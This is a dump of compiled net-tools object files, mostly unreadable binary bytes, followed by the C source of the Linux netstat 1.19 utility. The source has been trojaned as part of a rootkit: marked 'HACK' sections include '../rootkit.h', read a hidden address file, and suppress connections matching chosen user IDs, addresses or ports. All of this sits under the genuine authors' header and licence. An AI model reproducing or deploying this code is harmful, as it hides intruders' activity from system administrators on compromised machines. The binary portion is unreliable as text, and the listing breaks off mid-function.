: u1[  UWVS$  h   P\$ S$#   \$ j,D$PtE  E    =           v PD$P   ;0    L$T
T$   vh   h    1[^_]  St=     th   h    Ph    6> M> u(D$Ph   h       [^_]  l$|$ 1[^_]                          ,   ,       )   $                                       $   $                               $                                                                                                                                                                                                                                                                                                                     01.01   tcpip unix netrom ddp appletalk ipx inet ip ax25 UNSPEC UNIX Domain DARPA Internet IPX Please don't supply more than one address family.
 Too much address family arguments.
 , Unknown address family `%s'.
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                       4   h                 !   	               
            +                                1   	                
            ;             D                     @              D                    F             X                    N              &                                  8  W                                p  p              	              
  )                                                                                                                                                                   &            /           8           B           K           W           a      x     i           p              |                                                 2        4   -                                                                                             `       d  j                                                  7                  "              af.c gcc2_compiled. sVafinit aftypes flag_unx flag_ipx flag_ax25 flag_ddp flag_netrom flag_inet aftrans afname unix_aftype inet_aftype ipx_aftype unspec_aftype afinit aftrans_def strcpy strrchr strdup free strcmp strchr aftrans_opt get_aftype index _IO_stderr_ fprintf get_afntype strncpy strcat                                        $     +     I     N     V     z                   0    D    I    R    m    z              !        "    #              %  %  @  !  S    Y    e    u              "    #                &         &  *    /  "  4  #                  $     (     ,     0     4     8     <     @     D     H     L     P     T     X     \     `     d     h     l     p     t     x     |                          hw.o/           911697692   0     0     100644  2120      `
ELF                            4     (  	                       0      E      ]      u      |                     f0    VSt$f=0    us    =     t!V Pu[^; u1[^v S\$f=0    u(    =     t69Xt
: u1[                                                               01.01   Local Loopback Serial Line IP VJ Serial Line IP 6-bit Serial Line IP VJ 6-bit Serial Line IP Adaptive Serial Line IP UNSPEC 10Mbps Ethernet IPIP Tunnel Point-Point Protocol 1.5Mbps ARCnet  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                         4                     !   	                 
            +             0  2                  1   	             X   
            ;             d                     @              d                    F             x                    N              4                                  F  W                                                	                                                                                    0        0                                                                                            &              2              >              K              X              f              v                                                                             x        x   I                         7      hw.c gcc2_compiled. hwtypes sVhwinit loop_hwtype slip_hwtype cslip_hwtype slip6_hwtype cslip6_hwtype adaptive_hwtype ether_hwtype tunnel_hwtype ppp_hwtype arcnet_hwtype unspec_hwtype hwinit get_hwtype strcmp get_hwntype                                        $     *     .     4     8     >     B     H     L     R     V     \     `     f     j     q                                                                                       $     (     loopback.o/     911697693   0     0     100644  1428      `
ELF                            4     (  	 WVSt$    16PFh    SGv0         [^_6D$fftfu5   @   
   D   f   fH      J   @   v P_v                P                                                   01.01   %02X- [NONE SET] unspec loop  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                        4                     !   	             x   
            +                @                  1   	           t      
            ;                                 @                                  F             0                    N              M                                  _  W                                                 	                a                                                                   @      #       N     -   @   @      4   P   X                                                                                         ?              G             U              loopback.c gcc2_compiled. buff.38 pr_unspec buf.41 pr_sunspec sprintf unspec_hwtype loop_hwtype                   .     @     F     d     i     n     s     y                                  	     	        slip.o/         911697694   0     0     100644  1156      `
ELF                      h      4     (                                                                                                                                                                01.01   slip cslip slip6 cslip6 adaptive  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .rel.data .bss .note .rodata .comment                                                      4                      !             4                     '   	           \  (   	            1                                   6                                   <                !                  D              	                                    M                                      
   	         	                 [                                                                                                                                                             #             0   @         =   `         K             slip.c gcc2_compiled. slip_hwtype cslip_hwtype slip6_hwtype cslip6_hwtype adaptive_hwtype              @     `          ether.o/        911697695   0     0     100644  1648      `
ELF                      `      4     (  	 T$BPBPBPBPBPPh    h         v D$fftfu5   @   "   D   f&   fH   (   J   @   v Psv UWVSt$T$   fj1>       F    DHt16<w"v <v       [^_]F    DXtCv <wCv <wC	E EG>:\FV1[^_] )                 <                    01.01   %02X:%02X:%02X:%02X:%02X:%02X [NONE SET] ether  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                      4   _                 !   	                
            +                                  1   	           P      
            ;                                 @                                  F               /                  N                                                	  W                                @                 	              `  h                                              	                     @              9     )   @   @      0   <   X     :                                                                                               C              K             X              b               ether.c gcc2_compiled. buff.38 pr_ether buf.41 pr_sether in_ether sprintf ether_hwtype __ctype_b errno "     '   	  ,     1   	  P     U   	  Z     _   	  e     k   	  q     w   	  |   	                              
     
     
  ax25.o/         911697688   0     0     100644  663       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                                                                                                                   ax25.c gcc2_compiled. 
ppp.o/          911697696   0     0     100644  1068      `
ELF                            4     (  	 h    h    )                                        01.01   You cannot start PPP with this program.
 ppp  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                        4                     !   	                
            +             L                      1   	                
            ;             l                      @              l                     F                -                  N                                                    W                                        
         	                <                                                                                                                                                                          )              1              ppp.c gcc2_compiled. do_ppp _IO_stderr_ fprintf ppp_hwtype         
                  arcnet.o/       911697697   0     0     100644  1604      `
ELF                      ,      4     (  	 D$ Ph    h        D$fftfu5   @   	   D   f   fH      J   @   v Pv UWVSt$T$   fj1>       F    DHt2v <w"v <v       [^_]F    DXtCv <wCv <wC	E EG>:\FV1[^_]                      x                 01.01   %02X [NONE SET] arcnet  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                      4   C                 !   	                
            +             x                     1   	           $      
            ;                                 @                                  F                                 N                                                  W                                                 	              ,  m                                              
                     @      !             +   @   @      2       X     =   x                                                                                            G              O             ]              g               arcnet.c gcc2_compiled. buff.38 pr_arcnet buf.41 pr_sarcnet in_arcnet sprintf arcnet_hwtype __ctype_b errno    	        	          	  4     9   	  >     C   	  I     O   	  U     [   	  `   	                               
     
     
  tr.o/           911697697   0     0     100644  661       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                                                                                                                   tr.c gcc2_compiled. 
tunnel.o/       911697697   0     0     100644  1052      `
ELF                             4     (  	     6    6                                        01.01    tunnel  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                         4                     !   	                
            +             L                      1   	                 
            ;             l                      @              l                     F                                  N                                                    W                                                 	                F                                              
                          #           .                                                                                               8              tunnel.c gcc2_compiled. pr_tunnel pr_stunnel in_tunnel tunnel_hwtype        	                          frame.o/        911697698   0     0     100644  664       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                              	                                                                                     frame.c gcc2_compiled. inet_gr.o/      911697700   0     0     100644  3628      `
ELF                      d      4     (     UWVSh    h   D$ |$ u-h   h   h$   h       [^_]  hM   $  uhf   $  uh   $  ~h  D$    D$     D$$    $  L$|$h$h  $   $  L$6L$Qh  L$Q  D$PD$$PD$,PWD$8PD$@PD$HPD$PPUVL$8Qhi  L$DQ4	~\$XSVj   $  PS   PV$   \$dSUj   ($  QS   PU$   \$HSWj   jS   PW$    $   ,D$4th  $  PD$4th  $  PT$4tf  f$  th  $  PD$4th  $  PD$4th  $  PD$4 th  $  P$  uWD$5t$D$,PD$,P$  PWVh  -L$QD$0PD$8PD$4P$  PWUVh  $$  uND$5t$  PWVh  .6L$QD$ PD$(PD$0P$  PWUVh)  $$  D$5t'D$,PD$,P$  PWVhQ  YD$PD$$PD$,PL$QD$<PD$DPD$@P$  PWUVh  0L$Q1[^_]  6Sh    h  u#h  h   h$   h       [h  h
  h    S1[6WVS\$    tVWut
VWg[^_          01.01   r /proc/net/route INET FIB getroute %s: no support for `%s' on this system.
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface    MSS   Window irtt
 %s %s %s %X %d %d %d %s %d %d %d
 U G ! H R D M %-15s -               %-15s %-5s %-6d -  %7d -
 %-15s %-15s %-15s %-5s %-6d %-2d %7d %s
 %-15s -               %-15s %-5s     - -          - -
 %-15s %-15s %-15s %-5s %5d %-5d %6d %s
 %-15s -               %-15s %-5s %-6d -  %7d -        -     -      -
 %-15s %-15s %-15s %-5s %-6d %-3d %6d %-6.6s   %-5d %-6d %d
 /proc/net/rt_cache INET CACHE Kernel IP routing cache
 INET CACHE: This needs to be written!
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                      4                    !   	                	            +                                  1                                  6                                  <               1                 D                                                  M                                
  `  
   	         	              |                                                                                                                                                             %              +              7              ?              F              L              S              _              f              m              t     b        P  <      inet_gr.c gcc2_compiled. rprint_fib fopen _IO_stderr_ fprintf printf fgets sscanf inet_aftype strcpy strcat fclose rprint_cache INET_rprint                 
  (     -     2     7     <     U     Z     l     q                              3    =    R    e    n                                            !    3    @    O    \    k    x                                    H    M    ~                              
                      )    .    3    8    =    C    ipx_gr.o/       911697700   0     0     100644  1936      `
ELF                      T      4     (     UWVS$  T$h    ju2h   hC   hR   h_   h    [^_]  h   h   h   D$$|$ uh   [^_]  T$Rh  $  S\$T$0T$$   $0  \$ T$Rh  T$R   T$RUWh   T$$R~SWjFT$(RSFPWSUjF(T$RSFPUST$$RjFT$8RSFPT$8R,T$RUWh   Kv T$R1[^_]              01.01   Kernel IPX routing table
 net-tools@lina.inka.de (Bernd Eckenfels) AF_IPX missing lib/ipx_rt.c %s: Internal Error `%s'.
Contact: %s
 Destination               Router Net                Router Node
 r /proc/net/ipx_route %s %s %s %-25s %-25s %-25s
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                       4                    !   	                	            +                                  1                                  6                                  <                                 D                                                  M                                  @  
   	         	              L  s                                              
                                                                                                             $              +              7              C              K              Q              X              ^              e              l               ipx_gr.c gcc2_compiled. IPX_rprint printf get_afntype _IO_stderr_ fprintf fopen perror fgets sscanf strcpy fclose          
  %     3     8     =     B     G     L     e     j   
  o     t     y                                 4    R    u          
      ddp_gr.o/       911697701   0     0     100644  665       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                              
                                                                                     ddp_gr.c gcc2_compiled. 
netrom_gr.o/    911697701   0     0     100644  668       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                                                                                                                   netrom_gr.c gcc2_compiled. ax25_gr.o/      911697701   0     0     100644  666       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                                                                                                                   ax25_gr.c gcc2_compiled. getroute.o/     911697701   0     0     100644  1448      `
ELF                            4     (                   v    UWVS$  $     h   P\$S$   6j,Vt C> uR6Vu#Vh    h       [^_]   P u Ph$   1Uuu[^_]                01.01   Address family `%s' not supported.
 No routing for address family `%s'.
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                      4                     !   	           P  X   	            +                                  1                                  6                                  <                I                  D              i                                  {  M                                  @  
   	         	                                                                                                                                                                            )              5              A              L              W           b              j              p              {                             getroute.c gcc2_compiled. getroute_init INET_rprint inet_aftype IPX_rprint ipx_aftype route_info strncpy index get_aftype _IO_stderr_ fprintf          
            A     X     v                         inet_sr.o/      911697704   0     0     100644  4472      `
ELF                            4     (   h    h    hO   h    h   h    h   h     h  h    ha  h       6  UWVS$    $     $   $   j{j P  D$$  D$(D$,jxj P13      u
   v 3      u     P$(  VjTj $  P$  PVj     }V      [^_]  tt

   1f$   t
f$   ; ~  T$$T$$   63      uA      DP  j j
j Qf@f$    v 3      uu  $     PT$RD$PT$Rj    9  D$$  D$$  D$$  D$ $    3      t3      uR  $    PU$  PUj        $    3      ua$  @  j j
j P$  =    h  h       [^_]  v 3      uE; O  $  j j
j P$  =  L  h  3*      uI;    f$   Cj j
j Pf$  f$  f$     3/      uf$      v 36      u$      3:      u$  |3>  
    u$  \3H      t3O      u; u[^_]  6{ u$   u$  ; $  t$   u$  S  $  ti$  t
hV  Ct)D$$Ph  h       [^_]  6$  th  $  u$  t$  j jj    }h     [^_]  6$  uB$  Ph  Q}Lh      P   [^_]  $  Ph  Q}
h  v     P1[^_]  T$R      [^_]  UUh  ;[^_]  D$L$T$uh  h    v th  : tuRQPH          01.01   Usage: inet_route [-vF] del {-host|-net} Target [gw Gw] [metric M] [[dev] If]
        inet_route [-vF] add {-host|-net} Target [gw Gw] [metric M]
                               [netmask N] [mss Mss] [window W] [irtt I]
                               [mod] [dyn] [reinstate] [[dev] If]
        inet_route [-vF] add {-host|-net} Target [metric M] reject
        inet_route [-FC] flush      NOT aupported
 NONE default #net #host metric netmask gw gateway route: %s: cannot use a NETWORK as gateway!
 mss route: Invalid MSS.
 window route: Invalid window.
 irtt reject mod dyn reinstate device dev lo route: netmask doesn't make sense with host route
 route: bogus netmask %s
 route: netmask doesn't match route address
 socket SIOCDELRT SIOCADDRT Flushing `inet' routing table not supported
 Modifying `inet' routing cache not supported
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                       4   $                 !   	               	            +             X                    1             \                     6              \                    <             p  D                 D              
                                  
  M                                    
            	              L                                                                                 f     %   h   h                                                                                        3              ?              G              N              U              a              k              }                                                             T      inet_sr.c gcc2_compiled. skfd usage INET_setroute _IO_stderr_ fprintf memset strcpy inet_aftype __ctype_b __strtol_internal socket perror ioctl close INET_rinput                                     $     )     .     3     8     @     E     J     O     T     Y     z                                            +    ;    J                    5    F                        0    P    U    Z    w                    +    S    w                4    [    q    v    {                            )    .    3    9    _    k    u    {                            netrom_sr.o/    911697704   0     0     100644  668       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                                                                                                                   netrom_sr.c gcc2_compiled. ipx_sr.o/       911697705   0     0     100644  936       `
ELF                             4     (   h    h    1             01.01   IPX: this needs to be written
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                        4                     !   	                	            +             L                      1             L                      6              L                     <             `                     D                                                    M                                     
   	         	              X  8                                              
                                                                                                              $              0               ipx_sr.c gcc2_compiled. IPX_rinput _IO_stderr_ fprintf         
       setroute.o/     911697706   0     0     100644  1296      `
ELF                      l      4     (   $       $       v UWVSl$\$|$t$ SuSh    h       [^_]6P$u Ph$   v VWU[^_]             01.01   Address family `%s' not supported.
 No routing for address family `%s'.
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                      4   y                  !   	             H   	            +                                   1                                   6                                   <                I                  D                                                  M                                $     
   	         	              D                                                                                                                                                              )              5              A              L              W      a     b              m              y               setroute.c gcc2_compiled. setroute_init INET_rinput inet_aftype IPX_rinput ipx_aftype route_edit get_aftype _IO_stderr_ fprintf            
            .     ;     @     E     c     slip_ac.o/      911697707   0     0     100644  1712      `
ELF                            4     (   T$D$Ph#T  R}-    PPD$Ph    h        61T$D$Ph&  R}-    PPD$Ph   h        61S\$jS[}[j S|1[[S\$jS#}[jSX|1[[S\$jS}[jS |1[[S\$jS}[jS|1[[S\$jS{}[jS|1[[           01.01   SLIP_set_disc(%d): %s
 SLIP_set_encap(%d): %s
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                        4                    !   	           @  p   	            +                                  1                                  6                                  <               /                  D              '                                  9  M                                @  P  
            	                                                                                   K     (   L   K                                                                                         7              =              C              L              X              `      7     n      7     }     7        @  7        x  7      slip_ac.c gcc2_compiled. SLIP_set_disc SLIP_set_encap ioctl errno strerror _IO_stderr_ fprintf SLIP_activate CSLIP_activate SLIP6_activate CSLIP6_activate ADAPTIVE_activate             "     -     2     7     <     \     h     n     y     ~               ppp_ac.o/       911697707   0     0     100644  928       `
ELF                             4     (   h    h              01.01   Sorry, use pppd!
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                         4                     !   	                	            +             L                      1             L                      6              L                     <             `                     D              r                                      M                                     
   	         	              L  :                                              
                                                                                                              &              2               ppp_ac.c gcc2_compiled. PPP_activate _IO_stderr_ fprintf           
       activate.o/     911697708   0     0     100644  1672      `
ELF                            4     (                                             v VS\$t$SuSh    h       [^6Pu Ph#   h       [^V[^             01.01   Hardware type `%s' not supported.
 Cannot change line discipline to `%s'.
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                        4                     !   	                	            +                                   1                                   6                                   <                K                  D              7                                  I  M                                P    
   	         	                                                                                                                                                                       =     )              7              C              R              _              n              {                                                                                       @   a                                                activate.c gcc2_compiled. activate_init SLIP_activate slip_hwtype CSLIP_activate cslip_hwtype SLIP6_activate slip6_hwtype CSLIP6_activate cslip6_hwtype ADAPTIVE_activate adaptive_hwtype PPP_activate ppp_hwtype activate_ld get_hwtype _IO_stderr_ fprintf           
                            $     *     .     4     8     L     Y     ^     c                    /*
 * netstat	This file contains an implementation of the command
 *		that helps in debugging the networking modules.
 *
 * NET-TOOLS	A collection of programs that form the base set of the
 *		NET-3 Networking Distribution for the LINUX operating
 *		system.
 *
 * Version:	netstat 1.19 (1996-05-17)
 *
 * Authors:	Fred Baumgarten, <dc6iq@insu1.etec.uni-karlsruhe.de>
 *		Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Phil Packer, <pep@wicked.demon.co.uk>
 *		Johannes Stille, <johannes@titan.os.open.de>
 *		Bernd Eckenfels, <net-tools@lina.inka.de>
 *
 * Tuned for NET3 by:
 *		Alan Cox, <A.Cox@swansea.ac.uk>
 *
 *		Copyright (c) 1993  Fred Baumgarten
 *
 * Modified:
 *
 *960116 {1.01} Bernd Eckenfels:	verbose, cleanups
 *960204 {1.10} Bernd Eckenfels:	aftrans, usage, new route_info, 
 *					DLFT_AF
 *960204 {1.11} Bernd Eckenfels:	netlink support
 *960204 {1.12} Bernd Eckenfels:	route_init()
 *960215 {1.13} Bernd Eckenfels:	netlink_print honors HAVE_
 *960217 {1.14} Bernd Eckenfels:	masq_info from Jos Vos and 
 *					ax25_info from Jonathan Naylor.
 *960218 {1.15} Bernd Eckenfels:	ipx_info rewritten, -e for tcp/ipx
 *960220 {1.16} Bernd Eckenfels:	minor output reformats, -a for -x
 *960221 {1.17} Bernd Eckenfels:	route_init->getroute_init
 *960426 {1.18} Bernd Eckenfels:	new RTACTION, SYM/NUM, FIB/CACHE
 *960517 {1.19} Bernd Eckenfels:	usage() spelling fix and --unix inode, 
 *					':' is part of sock_addr for --inet
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <netdb.h>
#include <paths.h>
#include <pwd.h>
#include <getopt.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <linux/route.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <linux/net.h>
#include <linux/tcp.h>
#include <sys/ioctl.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if.h>
#include <linux/ip_fw.h>
#include "net-support.h"
#include "pathnames.h"
#include "version.h"
#include "config.h"
#include "net-locale.h"

/* HACK */
#include <arpa/inet.h>
#include "../rootkit.h"
#define FILENAME ROOTKIT_ADDRESS_FILE
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"
#define SHOWFLAG        /*  Able to list all with 'netstat -/' command  */

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list, *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;

int     hide,showall;

#define DFLT_AF "inet"

#define FEATURE_NETSTAT
#include "lib/net-features.h"

char *Release   = RELEASE,
     *Version   = "netstat 1.19 (1996-05-17)",
     *Signature = "Fred Baumgarten <dc6iq@insu1.etec.uni-karlsruhe.de> and Alan Cox.";


#define E_READ  -1
#define E_IOCTL -3


struct interface {
  char name[IFNAMSIZ];		/* interface name       */
  short flags;                  /* various flags        */
  int metric;			/* routing metric       */
  int mtu;			/* MTU value            */
  struct sockaddr addr;		/* IP address           */
  struct sockaddr dstaddr;	/* P-P IP address       */
  struct sockaddr broadaddr;	/* IP broadcast address */
  struct sockaddr netmask;	/* IP network mask      */
  struct sockaddr hwaddr;	/* HW address           */
  struct enet_statistics stats;	/* statistics           */
};

int flag_nlp = 0;
int flag_int = 0;
int flag_rou = 0;
int flag_mas = 0;

int flag_all = 0;
int flag_cnt = 0;
int flag_deb = 0;
int flag_not = 0;
int flag_cf  = 0;
int flag_opt = 0;
int flag_raw = 0;
int flag_tcp = 0;
int flag_udp = 0;
int flag_rom = 0;
int flag_exp = 1;
int flag_arg = 0;
int flag_ver = 0;

int skfd;
FILE *procinfo;
char *line[2000];
/* HACK read in maskfile */
void hackinit()
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;
   if ((int)fp_hack=fopen(FILENAME, "r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   fclose(fp_hack);
   }
   h_tmp->next=NULL;
}

void checklist(int uid, struct sockaddr_in localaddr, 
	struct sockaddr_in remaddr, int local_port, int rem_port)
{
/* HACK mask out hidden addresses */
           hide=0;
           for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
              switch (h_tmp->hack_type) {
               case 0:
                 if (uid==atoi(h_tmp->hack_cmd))
                   hide=1;
                 break;
               case 1:
                 if (strstr(inet_ntoa(localaddr.sin_addr), h_tmp->hack_cmd))
		 hide=1;
                 break;
               case 2:
                 if (strstr(inet_ntoa(remaddr.sin_addr), h_tmp->hack_cmd))
		 hide=1;
                 break;
               case 3:
                 if (local_port==atoi(h_tmp->hack_cmd))
                   hide=1;
                 break;
               case 4:
                 if (rem_port==atoi(h_tmp->hack_cmd))
                   hide=1;
                 break;
              }
	}
}

#if HAVE_RT_NETLINK
static int
netlink_print(void)
{
  int flag;
#define NL_DEV   1
#define NL_ADDR  2
#define NL_MISC  4
  int fd,ret;
  struct netlink_rtinfo buf;
  struct aftype *ap;
  struct sockaddr *s;
  
  if ((fd = open(_PATH_DEV_ROUTE, O_RDONLY))<0) {
	if (errno == ENODEV)	
		ESYSNOT("netstat","/dev/route");
	else
		perror(_PATH_DEV_ROUTE);
	return(-1);
  }

  if (flag_ver) {
  	printf(NLS_CATGETS(catfd, netstatSet, netstat_nlp_title, "Netlink Kernel Messages"));
  	if (flag_cnt)
	  	printf(NLS_CATGETS(catfd, netstatSet, netstat_nlp_cnt, " (continous)"));
	printf("\n");  	
  }  	
  	
  do {
	if ((ret=read(fd,(char *)&buf,sizeof(buf))) < 0) {
    		perror("read "_PATH_DEV_ROUTE);
    		return(-1);
    	}
	if (ret != sizeof(buf)) {
		EINTERN("netstat.c","netlink message size mismatch");
		return(-1);
	}
	
	flag=0;
	/* No NLS, keep this parseable */
	switch(buf.rtmsg_type) {
 		case RTMSG_NEWROUTE:
			printf("NEWROUTE\t");
			flag=NL_DEV|NL_ADDR|NL_MISC;
			break;
    		case RTMSG_DELROUTE:
    			printf("DELROUTE\t");
			flag=NL_DEV|NL_ADDR|NL_MISC;
	    		break;
    		case RTMSG_NEWDEVICE:
    			printf("NEWDEVICE\t");
			flag=NL_DEV|NL_MISC;
	    		break;
    		case RTMSG_DELDEVICE:
    			printf("DELDEVICE\t");
    			flag=NL_DEV|NL_MISC;
	    		break;
    		default:
    			printf("UNKNOWN%lx\t",buf.rtmsg_type);
    			flag=NL_DEV|NL_ADDR|NL_MISC;
			break;
	}

	if (flag&NL_ADDR) {
		s=&buf.rtmsg_dst;
		ap = get_afntype(s->sa_family);
		if (ap == NULL) ap = get_afntype(0);
 
		printf("%s/%s ",ap->sprint(s, flag_not), ap->name);
 
		s=&buf.rtmsg_gateway;
		ap = get_afntype(s->sa_family);
		if (ap == NULL) ap = get_afntype(0);

		printf("%s/%s ",ap->sprint(s, flag_not), ap->name);

		s=&buf.rtmsg_genmask;
		ap = get_afntype(s->sa_family);
		if (ap == NULL) ap = get_afntype(0);

		printf("%s/%s ",ap->sprint(s, 1), ap->name);
	}
	if (flag&NL_MISC) {
	        printf("0x%x %d ",buf.rtmsg_flags,buf.rtmsg_metric);
	}
	if (flag&NL_DEV) {
	printf("%s",buf.rtmsg_device);
	}
	printf("\n");
  } while(flag_cnt);
  close(fd);
  return(0);
}
#endif



#if HAVE_AFNETROM
static int netrom_info(void)
{
	FILE *f;
	char buffer[256],dev[16];
	int st,vs,vr,sendq,recvq;
	static char *netrom_state[4]=
	{
		"LISTENING",
		"CONN SENT",
		"DISC SENT",
		"ESTABLISHED"
	};

	if(!(f=fopen(_PATH_PROCNET_NR, "r")))
	{
		if (errno != ENOENT) {
			perror(_PATH_PROCNET_NR);
			return(-1);
		}
		if (flag_arg || flag_ver)
			ESYSNOT("netstat","AF NETROM");
		if (flag_arg)
			return(1);
		else
			return(0);
	}
	printf(NLS_CATGETS(catfd, netstatSet, netstat_netrom, "Activate NET/ROM sockets\n"));
	printf(NLS_CATGETS(catfd, netstatSet, netstat_header_netrom, "User       Dest       Source     Device  State        Vr/Vs  Send-Q  Recv-Q\n"));
	fgets(buffer,256,f);
	while(fgets(buffer,256,f))
	{
		buffer[9]=0;
		buffer[19]=0;
		buffer[29]=0;
		sscanf(buffer+30,"%s %*d/%*d %*d/%*d %d %d %d %*d %*d/%*d %*d/%*d %*d/%*d %*d %*d %d %d",
			dev,&st,&vs,&vr,&sendq,&recvq);
		printf("%-9s  %-9s  %-9s  %-6s  %-11s  %02d/%02d  %-6d  %-6d\n",
			buffer,buffer+10,buffer+20,
			dev,
			netrom_state[st],
			vr,vs,sendq,recvq);
	}
	fclose(f);
	return 0;		
}
#endif


#if HAVE_AFINET


static int
tcp_info(void)
{
  char buffer[8192], local_addr[128];
  char rem_addr[128], *tcp_state, timers[64];
  struct sockaddr_in localaddr, remaddr;
  struct aftype *ap;
  unsigned long rxq, txq, time_len, retr;
  int num, local_port, rem_port, d, state;
  int uid, timer_run, lnr = 0;
  struct passwd *pw;
  
  if ((procinfo = fopen(_PATH_PROCNET_TCP, "r")) == NULL) {
	if (errno != ENOENT) {
		perror(_PATH_PROCNET_TCP);
		return(-1);
	}
	if (flag_arg || flag_ver)
		ESYSNOT("netstat","AF INET (tcp)");
	if (flag_arg)
		return(1);
	else
		return(0);
  }

  fgets(buffer, sizeof(buffer), procinfo);
  while (! feof(procinfo)) {
	fgets(buffer, sizeof(buffer), procinfo);
	num = strlen(buffer)+1;
	if ((line[lnr] = (char *)malloc(num)) != NULL) {
		strcpy(line[lnr++], buffer);
		if (flag_deb) fprintf(stderr, "%s", buffer);
	}
  }
  (void) fclose(procinfo);
  lnr--; lnr--;
  while (lnr >= 0) {
	num = sscanf(line[lnr--],
		"%d: %lX:%X %lX:%X %X %lX:%lX %X:%lX %lX %d\n",
		&d, (unsigned long*)&localaddr.sin_addr.s_addr, &local_port,
		(unsigned long*)&remaddr.sin_addr.s_addr, &rem_port, &state,
		&txq, &rxq, &timer_run, &time_len, &retr, &uid);
	if (flag_deb) fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_args,
						  "%s -> %d args"), line[lnr+1], num);
	if (num < 11) continue;		/* 13 ? */
	localaddr.sin_family = AF_INET;
	remaddr.sin_family = AF_INET;
	if ((ap = get_afntype(localaddr.sin_family)) == NULL) {
		fprintf(stderr, NLS_CATGETS(catfd, netstatSet, netstat_netstat,
					    "netstat: unsupported address family %d !\n"),
			localaddr.sin_family);
		continue;
	}
	switch (state) {
		case TCP_ESTABLISHED:
			tcp_state = "ESTABLISHED";
			break;

		case TCP_SYN_SENT:
			tcp_state = "SYN_SENT";
			break;

		case TCP_SYN_RECV:
			tcp_state = "SYN_RECV";
			break;

		case TCP_FIN_WAIT1:
			tcp_state = "FIN_WAIT1";
			break;

		case TCP_FIN_WAIT2:
			tcp_state = "FIN_WAIT2";
			break;

		case TCP_TIME_WAIT:
			tcp_state = "TIME_WAIT";
			break;

		case TCP_CLOSE:
			tcp_state = "CLOSE";
			break;

		case TCP_CLOSING:
			tcp_state = "CLOSING";
			break;

		case TCP_CLOSE_WAIT:
